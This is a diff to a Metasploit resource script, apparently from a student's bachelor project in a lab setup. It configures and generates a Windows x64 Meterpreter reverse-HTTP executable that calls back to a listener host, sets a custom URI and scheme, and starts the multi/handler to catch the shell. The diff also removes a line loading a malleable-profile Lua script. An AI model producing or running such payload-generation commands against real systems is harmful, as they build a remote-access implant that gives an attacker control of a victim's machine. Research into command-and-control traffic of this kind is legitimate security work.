@@ -1,13 +1,15 @@
  setg LogLevel 3
  setg LHOST 192.168.42.131
 
+ setg OverrideScheme mhttp
+ setg luri mysuperduperpath
+ 
  use payload/windows/x64/meterpreter_reverse_http
  
  set LPORT 5555
-
- setg luri mysuperduperpath
+ 
  set OverrideRequestHost true
- set EXTINIT malleable,/home/timo/Projects/bachelor/malleableScript.lua
+ 
  generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.exe
 
  use multi/handler
